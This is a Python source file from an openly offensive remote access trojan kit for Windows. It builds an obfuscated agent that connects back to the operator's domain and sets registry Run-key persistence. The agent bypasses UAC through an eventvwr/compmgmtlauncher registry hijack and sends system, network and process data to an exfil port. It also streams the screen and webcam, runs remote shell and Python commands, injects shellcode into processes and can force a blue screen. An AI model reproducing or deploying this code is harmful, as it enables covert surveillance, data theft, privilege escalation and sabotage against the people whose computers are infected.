#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.23
# -------------------------------------------------------------
from ..utils.encryption import Scrambler
from core.logging.logging import LoggingUtilitys
from core.utils.utils import CFGFilePath


class Persistance:
    #Function will check the persistence option and return code for the pre-defined function
    def registry_start_up(self,registry_key,path_variable,option):
        if option == None:              #If the option is none
            code = 'pass'               #Make the function pass when the client executes it
        elif option == 'reg/run':       #If the persistence option is a run key,
            code = f"subprocess.run(f'reg add \"{registry_key}\" /v DCOM /t REG_SZ /d \"{{{path_variable}}}\" /f',shell=True)"  #Generate code for the key
        return code                     #Return the code


class QWireAgent():

    #Function will generate the initial agent code with settings from the builder and obfuscated variables
    def generate_agent_code(self, server_port, stream_port, exfil_port, domain_name, function_name, persistence_option):
        try:
            self.variable_length = int(LoggingUtilitys().retrieve_file_data(CFGFilePath().var_len_file))
        except ValueError:
            self.variable_length = 20
        SEP = Scrambler().scrambleVar(self.variable_length)
        BUFFER = Scrambler().scrambleVar(self.variable_length)
        SERV_PORT = Scrambler().scrambleVar(self.variable_length)
        EXFIL_PORT = Scrambler().scrambleVar(self.variable_length)
        STRM_PORT = Scrambler().scrambleVar(self.variable_length)
        MultiProcessor = Scrambler().scrambleVar(self.variable_length)
        start_child_thread = Scrambler().scrambleVar(self.variable_length)
        function = Scrambler().scrambleVar(self.variable_length)
        process = Scrambler().scrambleVar(self.variable_length)
        start_child_thread_arg = Scrambler().scrambleVar(self.variable_length)
        arg = Scrambler().scrambleVar(self.variable_length)
        Utilitys = Scrambler().scrambleVar(self.variable_length)
        get_windows_version = Scrambler().scrambleVar(self.variable_length)
        command = Scrambler().scrambleVar(self.variable_length)
        version_output = Scrambler().scrambleVar(self.variable_length)
        get_local_ip = Scrambler().scrambleVar(self.variable_length)
        local_ip = Scrambler().scrambleVar(self.variable_length)
        check_process_privilege = Scrambler().scrambleVar(self.variable_length)
        convert_string_to_bytes = Scrambler().scrambleVar(self.variable_length)
        string = Scrambler().scrambleVar(self.variable_length)
        string_to_bytes = Scrambler().scrambleVar(self.variable_length)
        extract_sys_ip_info = Scrambler().scrambleVar(self.variable_length)
        system_info = Scrambler().scrambleVar(self.variable_length)
        sysinfo_output = Scrambler().scrambleVar(self.variable_length)
        ip_config = Scrambler().scrambleVar(self.variable_length)
        ip_config_output = Scrambler().scrambleVar(self.variable_length)
        extracted_info = Scrambler().scrambleVar(self.variable_length)
        SystemManager = Scrambler().scrambleVar(self.variable_length)
        blue_screen = Scrambler().scrambleVar(self.variable_length)
        Encryption = Scrambler().scrambleVar(self.variable_length)
        encrypt_packet = Scrambler().scrambleVar(self.variable_length)
        data_to_encrypt = Scrambler().scrambleVar(self.variable_length)
        MASTER_KEY = Scrambler().scrambleVar(self.variable_length)
        encoded_data = Scrambler().scrambleVar(self.variable_length)
        encryption_object = Scrambler().scrambleVar(self.variable_length)
        encrypted_data = Scrambler().scrambleVar(self.variable_length)
        decrypt_packet = Scrambler().scrambleVar(self.variable_length)
        data_to_decrypt = Scrambler().scrambleVar(self.variable_length)
        decryption_object = Scrambler().scrambleVar(self.variable_length)
        plaintext = Scrambler().scrambleVar(self.variable_length)
        decrypted_data = Scrambler().scrambleVar(self.variable_length)
        ClientSocket = Scrambler().scrambleVar(self.variable_length)
        heartbeat = Scrambler().scrambleVar(self.variable_length)
        disconnect = Scrambler().scrambleVar(self.variable_length)
        stream_desktop = Scrambler().scrambleVar(self.variable_length)
        shutdown_computer = Scrambler().scrambleVar(self.variable_length)
        restart_computer = Scrambler().scrambleVar(self.variable_length)
        sys_info_exfil = Scrambler().scrambleVar(self.variable_length)
        screenshot = Scrambler().scrambleVar(self.variable_length)
        ping_server = Scrambler().scrambleVar(self.variable_length)
        reconnect_to_server = Scrambler().scrambleVar(self.variable_length)
        system_command = Scrambler().scrambleVar(self.variable_length)
        python_flag = Scrambler().scrambleVar(self.variable_length)
        env_var = Scrambler().scrambleVar(self.variable_length)
        dns_address = Scrambler().scrambleVar(self.variable_length)
        initiate_handshake = Scrambler().scrambleVar(self.variable_length)
        connect_to_server = Scrambler().scrambleVar(self.variable_length)
        client_socket = Scrambler().scrambleVar(self.variable_length)
        domain = Scrambler().scrambleVar(self.variable_length)
        start_echo = Scrambler().scrambleVar(self.variable_length)
        main = Scrambler().scrambleVar(self.variable_length)
        complete_handshake = Scrambler().scrambleVar(self.variable_length)
        information_array = Scrambler().scrambleVar(self.variable_length)
        windows_version = Scrambler().scrambleVar(self.variable_length)
        privilege = Scrambler().scrambleVar(self.variable_length)
        current_user = Scrambler().scrambleVar(self.variable_length)
        operating_system = Scrambler().scrambleVar(self.variable_length)
        extract_information = Scrambler().scrambleVar(self.variable_length)
        b64_encoded_key = Scrambler().scrambleVar(self.variable_length)
        negotiate_encryption = Scrambler().scrambleVar(self.variable_length)
        system_name = Scrambler().scrambleVar(self.variable_length)
        exfil_socket_send = Scrambler().scrambleVar(self.variable_length)
        ExfilSocket = Scrambler().scrambleVar(self.variable_length)
        execute_system_command = Scrambler().scrambleVar(self.variable_length)
        execute_python_code = Scrambler().scrambleVar(self.variable_length)
        CodeExecution = Scrambler().scrambleVar(self.variable_length)
        action_flag = Scrambler().scrambleVar(self.variable_length)
        receive_server_command = Scrambler().scrambleVar(self.variable_length)
        server_command = Scrambler().scrambleVar(self.variable_length)
        data = Scrambler().scrambleVar(self.variable_length)
        plain_text_data = Scrambler().scrambleVar(self.variable_length)
        partial_data = Scrambler().scrambleVar(self.variable_length)
        bytes_data = Scrambler().scrambleVar(self.variable_length)
        data_to_send = Scrambler().scrambleVar(self.variable_length)
        send_data_to_server = Scrambler().scrambleVar(self.variable_length)
        recv_all_data = Scrambler().scrambleVar(self.variable_length)
        exfil_socket = Scrambler().scrambleVar(self.variable_length)
        exfil_data = Scrambler().scrambleVar(self.variable_length)
        screen_cap = Scrambler().scrambleVar(self.variable_length)
        take_screenshot = Scrambler().scrambleVar(self.variable_length)
        image_file_path = Scrambler().scrambleVar(self.variable_length)
        StreamSocket = Scrambler().scrambleVar(self.variable_length)
        image_data = Scrambler().scrambleVar(self.variable_length)
        image_file = Scrambler().scrambleVar(self.variable_length)
        exec_ = Scrambler().scrambleVar(self.variable_length)
        error = Scrambler().scrambleVar(self.variable_length)
        ip_address = Scrambler().scrambleVar(self.variable_length)
        python_code = Scrambler().scrambleVar(self.variable_length)
        CURRENT_DIR = Scrambler().scrambleVar(self.variable_length)
        persistence_mechanism = Scrambler().scrambleVar(self.variable_length)
        code = Persistance().registry_start_up(
        function_name,CURRENT_DIR,persistence_option
        )
        extract_process_list = Scrambler().scrambleVar(self.variable_length)
        output = Scrambler().scrambleVar(self.variable_length)
        pid = Scrambler().scrambleVar(self.variable_length)
        kill_task = Scrambler().scrambleVar(self.variable_length)
        process_manager = Scrambler().scrambleVar(self.variable_length)
        term_process = Scrambler().scrambleVar(self.variable_length)
        initial_data = Scrambler().scrambleVar(self.variable_length)
        data_size = Scrambler().scrambleVar(self.variable_length)
        check_for_webcam = Scrambler().scrambleVar(self.variable_length)
        webcam = Scrambler().scrambleVar(self.variable_length)
        snapshot = Scrambler().scrambleVar(self.variable_length)
        webcam_snapshot = Scrambler().scrambleVar(self.variable_length)
        file = Scrambler().scrambleVar(self.variable_length)
        ret = Scrambler().scrambleVar(self.variable_length)
        web_cam = Scrambler().scrambleVar(self.variable_length)
        stream_sock = Scrambler().scrambleVar(self.variable_length)
        img = Scrambler().scrambleVar(self.variable_length)
        process_string = Scrambler().scrambleVar(self.variable_length)
        process_name =Scrambler().scrambleVar(self.variable_length)
        string = Scrambler().scrambleVar(self.variable_length)
        username = Scrambler().scrambleVar(self.variable_length)
        inject_python = Scrambler().scrambleVar(self.variable_length)
        process = Scrambler().scrambleVar(self.variable_length)
        inject_and_exec = Scrambler().scrambleVar(self.variable_length)
        get_root_key = Scrambler().scrambleVar(self.variable_length)
        root_key = Scrambler().scrambleVar(self.variable_length)
        local_machine = Scrambler().scrambleVar(self.variable_length)
        key_path = Scrambler().scrambleVar(self.variable_length)
        key_name = Scrambler().scrambleVar(self.variable_length)
        handle_registry_key = Scrambler().scrambleVar(self.variable_length)
        modify = Scrambler().scrambleVar(self.variable_length)
        root_key_bool = Scrambler().scrambleVar(self.variable_length)
        key_value = Scrambler().scrambleVar(self.variable_length)
        reg_key = Scrambler().scrambleVar(self.variable_length)
        delete = Scrambler().scrambleVar(self.variable_length)
        clean_up_key = Scrambler().scrambleVar(self.variable_length)
        key = Scrambler().scrambleVar(self.variable_length)
        good = Scrambler().scrambleVar(self.variable_length)
        bad = Scrambler().scrambleVar(self.variable_length)
        eventvwr_key = Scrambler().scrambleVar(self.variable_length)
        Elevation = Scrambler().scrambleVar(self.variable_length)
        uac_eventvwr = Scrambler().scrambleVar(self.variable_length)
        uac_compmgmt = Scrambler().scrambleVar(self.variable_length)
        esc_eventvwr = Scrambler().scrambleVar(self.variable_length)
        esc_compmgmt = Scrambler().scrambleVar(self.variable_length)
        agent_source = f"""
import socket as socket
import base64 as base64
import ctypes as ctypes
import platform as platform
import os as os
import subprocess as subprocess
import threading as threading
import struct as struct
import cv2
import psutil
import winreg
from PIL import ImageGrab as ImageGrab
from time import sleep as sleep
from cryptography.fernet import Fernet
from pymem import Pymem
{SEP} = '<sep>'
{BUFFER} = 4096
{SERV_PORT} = {server_port}
{EXFIL_PORT} = {exfil_port}
{STRM_PORT} = {stream_port}
{CURRENT_DIR} = f"{{os.getcwd()}}\\\\{{os.path.basename(__file__)}}".replace('.py','.exe')
class {MultiProcessor}:
    def {start_child_thread}(self,{function}):
        {process} = threading.Thread(target={function})
        {process}.daemon = True
        {process}.start()
    def {start_child_thread_arg}(self,{function},{arg}):
        {arg} = [{arg}]
        {process} = threading.Thread(target={function},args={arg})
        {process}.daemon = True
        {process}.start()
class {Utilitys}:
    def {get_windows_version}(self):
        {command} = subprocess.Popen(['powershell', '(Get-WmiObject -class Win32_OperatingSystem).Version'],stdout=subprocess.PIPE)
        {version_output} = {command}.stdout.read().decode()  
        {version_output} = {version_output}.replace('\\n','')
        return {version_output}.strip('\\r')              
    def {get_local_ip}(self):
        {local_ip} = socket.gethostbyname(socket.gethostname()) 
        return {local_ip}                                       
    def {check_process_privilege}(self):
        if ctypes.windll.shell32.IsUserAnAdmin():
            return "Administrator"
        else:
            return "User"
    def {persistence_mechanism}(self):
        {code}
    def {convert_string_to_bytes}(self, {string}):
        {string_to_bytes} = str({string}).encode()                                   
        return {string_to_bytes}                                                     
    def {extract_sys_ip_info}(self):
        {system_info} = subprocess.Popen('systeminfo', stdout=subprocess.PIPE)
        {sysinfo_output} = {system_info}.stdout.read().decode()                
        {ip_config} = subprocess.Popen('ipconfig /all', stdout=subprocess.PIPE)    
        {ip_config_output} = {ip_config}.stdout.read().decode()                  
        {extracted_info} = f'{{{sysinfo_output}}}\\n{{{ip_config_output}}}'             
        return {extracted_info}
    def {check_for_webcam}(self):
        {webcam} = cv2.VideoCapture(0)
        if not {webcam}.isOpened():
            {webcam}.release()
            return False
        {webcam}.release()
        return True
    def {get_root_key}(self,{local_machine}):
        if {local_machine}:
            {root_key} = winreg.HKEY_LOCAL_MACHINE
        elif not {local_machine}:
            {root_key} = winreg.HKEY_CURRENT_USER
        return {root_key}
class {SystemManager}:
    def {blue_screen}(self):
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6)
    def {restart_computer}(self):
        subprocess.run('shutdown /r /t 0',shell=True)
    def {shutdown_computer}(self):
        subprocess.run('shutdown /p')
    def {extract_process_list}(self):
        {process_string} = ''
        for {process} in psutil.process_iter():
            {process_name} = {process}.name()
            {pid} = {process}.pid
            try:
                {username} = {process}.username()
            except psutil.AccessDenied:
                {username} = 'NT AUTHORITY\SYSTEM'
            {string} = f'{{{process_name}}}{{{SEP}}}{{str({pid})}}{{{SEP}}}{{{username}}}{{{SEP}}}\\n'
            {process_string} += {string}
        {ExfilSocket}().{exfil_socket_send}({process_string})  
    def {kill_task}(self,{pid}):
        {command} = subprocess.Popen(['taskkill','/pid',str({pid}),'/f'],stdout=subprocess.PIPE,shell=True)
        {output} = {command}.stdout.read().decode()
        {ExfilSocket}().{exfil_socket_send}({output})
    def {handle_registry_key}(self,{modify},{root_key_bool},{key_path},{key_value},{key_name}):
        {root_key} = {Utilitys}().{get_root_key}({root_key_bool})
        try:
            if {modify}:
                {reg_key} = winreg.OpenKey({root_key},{key_path},0,winreg.KEY_ALL_ACCESS)
            elif not {modify}:
                {reg_key} = winreg.CreateKey({root_key},{key_path})
            winreg.SetValueEx({reg_key},{key_name},0,winreg.REG_SZ,{key_value})
            winreg.CloseKey({reg_key})
            return True
        except Exception:
            return False
    def {clean_up_key}(self,{delete},{root_key_bool},{key_path},{key_name}):
        {root_key} = {Utilitys}().{get_root_key}({root_key_bool})
        try:
            if not {delete}:
                {key} = winreg.OpenKey({root_key},{key_path},0,winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue({key},{key_name})
                winreg.CloseKey({key})
            if {delete}:
                winreg.DeleteKey({root_key},{key_path})
        except Exception:
            pass
class {Elevation}:
    def __init__(self):
        self.{eventvwr_key} = os.path.join('Software\\Classes\\mscfile\\shell\\open\\command')
    def {uac_eventvwr}(self):
        if {SystemManager}().{handle_registry_key}(True,False,self.{eventvwr_key},{CURRENT_DIR},None):
            subprocess.run('eventvwr',shell=True)
            {SystemManager}().{clean_up_key}(False,False,self.{eventvwr_key},None)
            {ExfilSocket}().{exfil_socket_send}({ClientSocket}().{good})
        else:
            {ExfilSocket}().{exfil_socket_send}(ClientSocket().{bad})
    def {uac_compmgmt}(self):
        if {SystemManager}().{handle_registry_key}(True,False,self.{eventvwr_key},{CURRENT_DIR},None):
            subprocess.run('compmgmtlauncher',shell=True)
            {SystemManager}().{clean_up_key}(False,False,self.{eventvwr_key},None)
            {ExfilSocket}().{exfil_socket_send}({ClientSocket}().{good})
        else:
            {ExfilSocket}().{exfil_socket_send}({ClientSocket}().{bad})
class {Encryption}:
    def {encrypt_packet}(self,{data_to_encrypt}):
        {encryption_object} = Fernet({MASTER_KEY})                      
        {encoded_data} = {data_to_encrypt}.encode()                     
        {encrypted_data} = {encryption_object}.encrypt({encoded_data})   
        return {encrypted_data}                                       
    def {decrypt_packet}(self,{data_to_decrypt}):
        {decryption_object} = Fernet({MASTER_KEY})                    
        {decrypted_data} = {decryption_object}.decrypt({data_to_decrypt})
        {plaintext} = {decrypted_data}.decode()                        
        return {plaintext}                                           
class {ClientSocket}:
    def __init__(self):
        self.{heartbeat} = 'echo'
        self.{dns_address} = '{domain_name}'
        self.{env_var} = 'USERNAME'
        self.{python_flag} = 'python'
        self.{system_command} = 'system'
        self.{reconnect_to_server} = 'reconnect'
        self.{ping_server} = 'ping'
        self.{sys_info_exfil} = 'sys_info'
        self.{blue_screen} = 'bsod'
        self.{restart_computer} = 'restart'
        self.{shutdown_computer} = 'shutdown'
        self.{screenshot} = 'screenshot'
        self.{stream_desktop} = 'stream_desktop'
        self.{disconnect} = 'disconnect'
        self.{process_manager} = 'proc_list'
        self.{term_process} = 'terminate'
        self.{snapshot} = 'snap_shot'
        self.{inject_python} = 'inject_pie'
        self.{good} = 'good'
        self.{bad} = 'bad'
        self.{esc_eventvwr} = 'esc_eventvwr'
        self.{esc_compmgmt} = 'esc_compmgmt'
    def {connect_to_server}(self):
        {domain} = socket.gethostbyname(self.{dns_address})                  
        self.{client_socket} = socket.socket(socket.AF_INET,socket.SOCK_STREAM)       
        while True:                                                                 
            try:
                self.{client_socket}.connect(({domain},{SERV_PORT}))                          
                break                                                               
            except socket.error:                                                    
                self.{client_socket}.close()                                          
                sleep(10)                                                           
                return self.{connect_to_server}()                                     
        return self.{initiate_handshake}()
    def {initiate_handshake}(self):
        {system_name} = socket.gethostname()
        {Utilitys}().{persistence_mechanism}()                                          
        self.{client_socket}.send({Utilitys}().{convert_string_to_bytes}({system_name}))   
        return self.{negotiate_encryption}()
    def {negotiate_encryption}(self):
        global {MASTER_KEY}                                                           
        {b64_encoded_key} = self.{client_socket}.recv({BUFFER})                           
        {MASTER_KEY} = base64.b64decode({b64_encoded_key})                              
        return self.{extract_information}()
    def {extract_information}(self):
        {local_ip} = {Utilitys}().{get_local_ip}()                           
        {operating_system} = f'{{platform.system()}} {{platform.release()}}'  
        {current_user} = os.environ[self.{env_var}]                           
        {privilege} = {Utilitys}().{check_process_privilege}()                
        {windows_version} = {Utilitys}().{get_windows_version}()              
        {information_array} = []                                          
        {information_array}.append({local_ip})
        {information_array}.append({operating_system})
        {information_array}.append({current_user})
        {information_array}.append({privilege})
        {information_array}.append({windows_version})
        self.{client_socket}.send({Encryption}().{encrypt_packet}(str({information_array})))
        return self.{complete_handshake}()
    def {complete_handshake}(self):
        {MultiProcessor}().{start_child_thread}(self.{start_echo})
        return self.{main}()
    def {start_echo}(self):
        while True:
            self.{client_socket}.send({Encryption}().{encrypt_packet}(self.{heartbeat}))
            sleep(60)
    def {main}(self):
        while True:                                        
            {server_command} = self.{receive_server_command}() 
            {server_command} = {server_command}.split({SEP})     
            {action_flag} = {server_command}[0]                
            if {action_flag} == self.{python_flag}:            
                {CodeExecution}().{execute_python_code}({server_command}[1])
            if {action_flag} == self.{system_command}:                      
                {CodeExecution}().{execute_system_command}({server_command}[1])   
            if {action_flag} == self.{reconnect_to_server}:                
                self.{client_socket}.close()                              
                return self.{connect_to_server}()                        
            if {action_flag} == self.{ping_server}:                         
                {ExfilSocket}().{exfil_socket_send}(f'{{socket.gethostname()}} Is Online')
            if {action_flag} == self.{sys_info_exfil}:                              
                {ExfilSocket}().{exfil_socket_send}(f'{{{Utilitys}().{extract_sys_ip_info}()}}')
            if {action_flag} == self.{blue_screen}:                                      
                self.{client_socket}.close()                                         
                {SystemManager}().{blue_screen}()                                   
            if {action_flag} == self.{restart_computer}:                           
                {SystemManager}().{restart_computer}()                         
            if {action_flag} == self.{shutdown_computer}:                            
                {SystemManager}().{shutdown_computer}()                                
            if {action_flag} == self.{screenshot}:                                      
                {StreamSocket}().{stream_desktop}(True)                       
            if {action_flag} == self.{disconnect}:                                       
                exit()
            if {action_flag} == self.{process_manager}:                                   
                {SystemManager}().{extract_process_list}()                                
            if {action_flag} == self.{term_process}:                                      
                {SystemManager}().{kill_task}({server_command}[1])
            if {action_flag} == self.{snapshot}:
                {StreamSocket}().{webcam_snapshot}()
            if {action_flag} == self.{inject_python}:
                {CodeExecution}().{inject_and_exec}({server_command}[1],{server_command}[2])
            if {action_flag} == self.{esc_eventvwr}:
                {Elevation}().{uac_eventvwr}()
            if {action_flag} == self.{esc_compmgmt}:
                {Elevation}().{uac_compmgmt}()                     
    def {recv_all_data}(self):
        try:
            {bytes_data} = b''
            {initial_data} = self.{client_socket}.recv({BUFFER})              
            {data_size} = {initial_data}.split('|'.encode())             
            if len({initial_data}) < int(str({data_size}[0].decode())):      
                {bytes_data}+={data_size}[1]                     
                while len({bytes_data}) != int(str({data_size}[0].decode())):   
                    {partial_data} = self.{client_socket}.recv({BUFFER})          
                    {bytes_data} += {partial_data}                              
                return {bytes_data}                                           
            else:                                                           
                return {data_size}[1]
        except ValueError:
            return self.{connect_to_server}()
        except ConnectionResetError:
            return self.{connect_to_server}()                                                        
    def {receive_server_command}(self):
        {data} = self.{recv_all_data}()         
        if not {data}:                            
            return self.{connect_to_server}()     
        {plain_text_data} = {Encryption}().{decrypt_packet}({data}) 
        return {plain_text_data}                              
    def {send_data_to_server}(self,{data}):
        {data_to_send} = {Encryption}().{encrypt_packet}({data})          
        self.{client_socket}.send({data_to_send})                     
class {ExfilSocket}:
    def {exfil_socket_send}(self, {exfil_data}):
        {domain} = socket.gethostbyname({ClientSocket}().{dns_address})        
        {exfil_socket} = socket.socket(socket.AF_INET,socket.SOCK_STREAM)   
        {exfil_socket}.connect(({domain},{EXFIL_PORT}))                        
        {encrypted_data} = {Encryption}().{encrypt_packet}({exfil_data})        
        {exfil_socket}.sendall({encrypted_data})                              
        {exfil_socket}.close()                                                
class {StreamSocket}:
    def __init__(self):
        self.{image_file_path} = str(f'{{os.getenv("userprofile")}}\\AppData\\Local\\Temp\\c.jpg')
    def {take_screenshot}(self):
        {screen_cap} = ImageGrab.grab()                          
        {screen_cap}.save(self.{image_file_path}, 'jpeg')         
        with open(self.{image_file_path}, 'rb') as {image_file}:   
            {image_data} = {image_file}.read()                     
            {image_file}.close()                                 
        return {image_data}                                       
    def {stream_desktop}(self,{screenshot}):
        {StreamSocket} = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        
        {ip_address} = socket.gethostbyname({ClientSocket}().{dns_address})                   
        {StreamSocket}.connect(({ip_address},{STRM_PORT}))                           
        if not {screenshot}:                                                  
            while True:                                                
                {image_data} = self.{take_screenshot}()                          
                {StreamSocket}.sendall(struct.pack(">Q", len({image_data}))) 
                {StreamSocket}.sendall({image_data})                                
        elif {screenshot}:                                                        
            {image_data} = self.{take_screenshot}()                                 
            {StreamSocket}.sendall(struct.pack(">Q", len({image_data})))            
            {StreamSocket}.sendall({image_data})                                    
        {StreamSocket}.close()
    def {webcam_snapshot}(self):
        if not {Utilitys}().{check_for_webcam}():
            {ExfilSocket}().{exfil_socket_send}('NoneFound')
        else:
            {ExfilSocket}().{exfil_socket_send}('Found')
            {stream_sock} = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create socket
            {stream_sock}.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            {ip_address} = socket.gethostbyname({ClientSocket}().{dns_address})  # Resolve dns
            {stream_sock}.connect(({ip_address}, {STRM_PORT}))  # connect to ip and streaming port
            {web_cam} = cv2.VideoCapture(0)
            {ret}, {img} = {web_cam}.read()
            cv2.imwrite(self.{image_file_path},{img})
            with open(self.{image_file_path},'rb') as {file}:
                {data} = {file}.read()
                {file}.close()
            {stream_sock}.sendall(struct.pack(">Q",len({data})))
            {stream_sock}.sendall({data})
            {stream_sock}.close()                                                    
class {CodeExecution}():
    def {execute_python_code}(self,{python_code}):
        def {exec_}({python_code}):
            try:
                exec(str({python_code}))
            except Exception as {error}:
                pass
        {MultiProcessor}().{start_child_thread_arg}({exec_},{python_code})   
    def {execute_system_command}(self,{system_command}):
        def {exec_}({system_command}):
            try:
                subprocess.run({system_command},shell=True)
            except Exception as {error}:
                pass
        {MultiProcessor}().{start_child_thread_arg}({exec_},{system_command})
    def {inject_and_exec}(self,{process_name},{python_code}):
        {process} = Pymem({process_name})
        {process}.inject_python_interpreter()
        {process}.inject_python_shellcode({python_code})
{ClientSocket}().{connect_to_server}()
"""
        return agent_source